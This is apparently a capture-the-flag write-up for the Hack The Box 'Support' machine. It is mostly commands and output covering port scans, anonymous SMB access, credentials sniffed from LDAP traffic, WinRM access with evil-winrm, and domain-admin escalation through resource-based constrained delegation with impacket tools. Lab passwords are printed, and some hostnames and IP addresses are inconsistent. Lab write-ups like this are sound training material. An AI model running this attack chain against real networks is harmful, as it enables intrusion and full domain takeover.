# Scope

10.129.18.27
# Information Gathering

## port discovery:

```
sudo nmap -sS -Pn -p- -T5 -v 10.129.227.77 | grep "Discovered open port" | grep -oP 'port \K[0-9]+' > tcp-ports.txt
```

open tcp ports:
```
135
139
53
445
593
49664
389
49667
49678
464
3269
49703
3268
636
9389
49690
5985
88
```

open udp ports:
```
53
123
88
389
```

**Considerations:**
Just by observing the open ports we can safely say that is a Windows AD Domain Controller. First having ports 135,139 and 445 are windows SMB ports. Also based on ports 88 and 53 being open, having both of them open is a strong indication of being a DC.

We should keep in mind AD vulnerabilities as well.
## dns information:

`dig 10.129.18.27`

```
; <<>> DiG 9.20.20-1-Debian <<>> 10.129.18.27
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 48732
;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 512
;; QUESTION SECTION:
;10.129.18.27.			IN	A

;; AUTHORITY SECTION:
.			86397	IN	SOA	a.root-servers.net. nstld.verisign-grs.com. 2026033002 1800 900 604800 86400

;; Query time: 60 msec
;; SERVER: 192.168.18.1#53(192.168.18.1) (UDP)
;; WHEN: Mon Mar 30 19:27:43 EDT 2026
;; MSG SIZE  rcvd: 116
```

# Enumeration

## port scanning:
`sudo nmap -sS -sV -sC -O -p $(paste -sd, tcp-ports.txt) -T5 -v 10.129.18.27 -oN tcp-scan.txt`

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-30 22:30:50Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.012 days (since Mon Mar 30 19:14:43 2026)
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-03-30T22:31:45
|_  start_date: N/A
|_clock-skew: -1h00m11s
```

`sudo nmap -sU -sV -sC -O -p $(paste -sd, udp-ports.txt) -T5 -v 10.129.18.27 -oN udp-scan.txt`

```
PORT    STATE SERVICE      VERSION
53/udp  open  domain       (generic dns response: NOTIMP)
| fingerprint-strings:
|   DNS-SD:
|     _services
|     _dns-sd
|     _udp
|     local
|   NBTStat:
|_    CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
88/udp  open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-03-30 22:33:30Z)
123/udp open  ntp          NTP v3
| ntp-info:
|_  receive time stamp: 2026-03-30T22:34:08
389/udp open  ldap         Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-UDP:V=7.98%I=7%D=3/30%Time=69CB0863%P=x86_64-pc-linux-gnu%r(DNS-
SF:SD,2E,"\0\0\x80\x82\0\x01\0\0\0\0\0\0\t_services\x07_dns-sd\x04_udp\x05
SF:local\0\0\x0c\0\x01")%r(NBTStat,32,"\x80\xf0\x80\x82\0\x01\0\0\0\0\0\0\
SF:x20CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\0\0!\0\x01");
Too many fingerprints match this host to give specific OS details
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -59m58s
```

## service enumeration:

### smb

`smbclient -N -L \\\\10.129.18.27\\`

```
Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share
	support-tools   Disk      support staff tools
	SYSVOL          Disk      Logon server share
```

It appears we are able to anonymously logon to the smb server, let's attempt to access shares.

After attempting to connect to all the shares we found out that the only one we are allowed to access is `support-tools`

```
$ smbclient -N \\\\10.129.18.27\\support-tools
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Jul 20 13:01:06 2022
  ..                                  D        0  Sat May 28 07:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 07:19:55 2022
  putty.exe                           A  1273576  Sat May 28 07:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 07:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 13:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 07:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 07:19:43 2022

		4026367 blocks of size 4096. 970762 blocks available
```

There are many tools listed. Let's download all of them to our machine and investigate we also can search for known vulnerabilities associated with said tools.

observation:
**Portable Apps (.paf.exe):** Often found as `filename.paf.exe`, these are self-extracting installers used to run portable apps from a USB flash drive.

**7zip**:
	[7zip 21.07 privesc](https://security.snyk.io/vuln/SNYK-CONAN-7ZIP-10074161)
**npp**:
	[Notepad++ 8.4.1 DLL highjacking](https://www.tenable.com/plugins/nessus/208192)
**windirstat**:
	[windirstat 1.1.2 possible trojan](https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://blog.windirstat.net/20130717/windirstat-detected-as-trojan-rightly-so/&ved=2ahUKEwiMu-nX3ciTAxVXrpUCHbrBEDgQFnoECAwQAQ&usg=AOvVaw3aoZllvPTWbn2IqhvQJCFN)
**wireshark**:
	[Wireshark 64 3.6.5 denial of service via packet injection or crafted capture file](https://www.tenable.com/plugins/nessus/187623)

Also there is an executable file which has the name `UserInfo.exe.zip`. I bet there is something interesting in there:

`unzip UserInfo.exe.zip -d UserInfo/`

```
$ ls UserInfo/
CommandLineParser.dll
Microsoft.Bcl.AsyncInterfaces.dll
Microsoft.Extensions.DependencyInjection.Abstractions.dll
Microsoft.Extensions.DependencyInjection.dll
Microsoft.Extensions.Logging.Abstractions.dll
System.Buffers.dll
System.Memory.dll
System.Numerics.Vectors.dll
System.Runtime.CompilerServices.Unsafe.dll
System.Threading.Tasks.Extensions.dll
UserInfo.exe
UserInfo.exe.config
```

There's a lot of dll files: possible dll injection?

let's view the `UserInfo.exe.config` file 

```
$ cat UserInfo.exe.config
<?xml version="1.0" encoding="utf-8"?>
<configuration>
    <startup>
        <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.8" />
    </startup>
  <runtime>
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <dependentAssembly>
        <assemblyIdentity name="System.Runtime.CompilerServices.Unsafe" publicKeyToken="b03f5f7f11d50a3a" culture="neutral" />
        <bindingRedirect oldVersion="0.0.0.0-6.0.0.0" newVersion="6.0.0.0" />
      </dependentAssembly>
    </assemblyBinding>
  </runtime>
</configuration>
```

PublicKeyTokens aren't really relevant. And there isnt much info here. Let's try to view strings in the binary:

`strings UserInfo.exe`

```
...
getPassword
enc_password
get_Message
IDisposable
Console
set_AppName
get_UserName
set_UserName
get_LastName
set_LastName
get_FirstName
set_FirstName
username
FromFileTime
DateTime
FindOne
...
```

We didn't find creds so let's try to run the executable using `wine` and see what we find:

`wine UserInfo.exe`

```
00ec:fixme:mscoree:parse_supported_runtime sku=L".NETFramework,Version=v4.8" not implemented
00ec:fixme:mscoree:parse_supported_runtime sku=L".NETFramework,Version=v4.8" not implemented
00ec:fixme:ntdll:NtQuerySystemInformation info_class SYSTEM_PERFORMANCE_INFORMATION

Usage: UserInfo.exe [options] [commands]

Options:
  -v|--verbose        Verbose output

Commands:
  find                Find a user
  user                Get information about a user
```

It seems to grab or generate user information, lets proceed further

```
$ wine UserInfo.exe find -h
00ec:fixme:mscoree:parse_supported_runtime sku=L".NETFramework,Version=v4.8" not implemented
00ec:fixme:mscoree:parse_supported_runtime sku=L".NETFramework,Version=v4.8" not implemented
00ec:fixme:ntdll:NtQuerySystemInformation info_class SYSTEM_PERFORMANCE_INFORMATION

Usage: UserInfo.exe find [options]

Options:
  -first              First name
  -last               Last name
```

```
$ wine UserInfo.exe find -first test
00ec:fixme:mscoree:parse_supported_runtime sku=L".NETFramework,Version=v4.8" not implemented
00ec:fixme:mscoree:parse_supported_runtime sku=L".NETFramework,Version=v4.8" not implemented
00ec:fixme:ntdll:NtQuerySystemInformation info_class SYSTEM_PERFORMANCE_INFORMATION
[-] Exception: Connect Error
```

Let's add support.htb to our hosts file:
```
echo '10.129.19.36 support.htb' | sudo tee -a /etc/hosts
```

Okay let's try it again:
```
$ wine UserInfo.exe find -first test
00ec:fixme:mscoree:parse_supported_runtime sku=L".NETFramework,Version=v4.8" not implemented
00ec:fixme:mscoree:parse_supported_runtime sku=L".NETFramework,Version=v4.8" not implemented
00ec:fixme:ntdll:NtQuerySystemInformation info_class SYSTEM_PERFORMANCE_INFORMATION
[-] Exception: No Such Object
```

So it didnt find anything with the name test. Let's use the verbose option to see whats under the hood:

```
$ wine UserInfo.exe find -first test -v
00ec:fixme:mscoree:parse_supported_runtime sku=L".NETFramework,Version=v4.8" not implemented
00ec:fixme:mscoree:parse_supported_runtime sku=L".NETFramework,Version=v4.8" not implemented
00ec:fixme:ntdll:NtQuerySystemInformation info_class SYSTEM_PERFORMANCE_INFORMATION
[*] LDAP query to use: (givenName=test)
[-] Exception: No Such Object
```

```
$ wine UserInfo.exe user -username test -v
0128:fixme:mscoree:parse_supported_runtime sku=L".NETFramework,Version=v4.8" not implemented
0128:fixme:mscoree:parse_supported_runtime sku=L".NETFramework,Version=v4.8" not implemented
0128:fixme:ntdll:NtQuerySystemInformation info_class SYSTEM_PERFORMANCE_INFORMATION
[*] Getting data for test
[-] Exception: No Such Object
```

Ohhhh it an LDAP query, that makes a lot of sense. Let's try and capture the network traffic using wireshark and see if there are any credentials:

`sudo wireshark -i tun0`

`wine UserInfo.exe user -username test`
`wine UserInfo.exe user -username administrator`

after going through the ldap packets we found an authentication process:
![[Pasted image 20260401225900.png]]

we found the following user and password: `support:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

### ldap

with the ldap password we found let's try to enumerate user information

we can use `ldapsearch` or `netexec` modules 

`$ netexec ldap 10.129.19.106 -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -M get-info-users
`

```
$ netexec ldap 10.129.19.106 -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -M get-info-users
LDAP        10.129.19.106   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.19.106   389    DC               [+] support\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
GET-INFO... 10.129.19.106   389    DC               [+] Found following users:
GET-INFO... 10.129.19.106   389    DC               User: support              Info: Ironside47pleasure40Watchful
```

We found a possible password `Ironside47pleasure40Watchful`

### winrm

with the passwords and user we enumerated let's see if we can gain access to the machine with `winrm` and `evil-winrm`

```
netexec winrm 10.129.19.106 -u users.txt -p passwords.txt
```

```
WINRM       10.129.19.106   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
...
...
WINRM       10.129.19.106   5985   DC               [-] support.htb\administrator:Ironside47pleasure40Watchful
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.19.106   5985   DC               [+] support.htb\support:Ironside47pleasure40Watchful (Pwn3d!)
```

Great we have valid creds! Not only that but it appears to be a high value target since `(Pwn3d!)` appeared.

# Exploitation

## initial access:

```
evil-winrm -i 10.129.19.106 -u support -p Ironside47pleasure40Watchful
```

```
Evil-WinRM shell v3.9
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\support\Documents>
```

Success! now let's information gather and try get the admin user

## information gathering:

Let's upload winPEASx64.exe via evil-winrm and run a scan to see any potential priv-esc vulns.

```
a
```

We didn't find anything let's try AD vulns using sharphound and bloodhound:
1. Upload Sharphound
2. Download the generated zip file
3. Start Bloodhound on your machine
4. import the zip file
5. Inspect for vulns

The Shared Support Accounts group has generic all privileges. And the support user is apart of the group.

We can use RBCD vulnerability to escalate privileges:

1. add a machine we control to AD
```
impacket-addcomputer support.htb/support:Ironside47pleasure40Watchful -computer-name 'HACKER$' -computer-pass 'happy' -dc-host 10.129.19.207 -domain-netbios SUPPORT
```
2. Now delegate DC responsibilities to said machine
```
impacket-rbcd support.htb/support:Ironside47pleasure40Watchful -delegate-from HACKER$ -action write -delegate-to DC$ -dc-ip 10.129.19.207
```
3. Now our can HACKER$ machine can impersonate the Administrator account on behalf of the DC
```
impacket-getST support.htb/HACKED$:'happy' -spn cifs/DC.SUPPORT.HTB -impersonate Administrator -dc-ip 10.129.19.207
```

obs: if you get an error like:
```
[-] CCache file is not found. Skipping...
[*] Getting TGT for user
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```
We can fix it on our machine like this:
`sudo timedatectl set-ntp off`
then
`sudo ntpdate 10.129.19.207`
finally just rerun the command:
```
$ impacket-getST support.htb/HACKED$:'happy' -spn cifs/DC.SUPPORT.HTB -impersonate Administrator -dc-ip 10.129.19.207
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC.SUPPORT.HTB@SUPPORT.HTB.ccache
```
4. Put kerberos cache file in environment variables:
```
export KRB5CCNAME=~/CTFs/HTB/Support/Administrator@cifs_DC.SUPPORT.HTB@SUPPORT.HTB.ccache
```
4. Gain a shell with psexec:
```
impacket-psexec -k -dc-ip 10.129.19.207 Administrator@DC.SUPPORT.HTB 'cmd.exe'
```
# Post Exploitation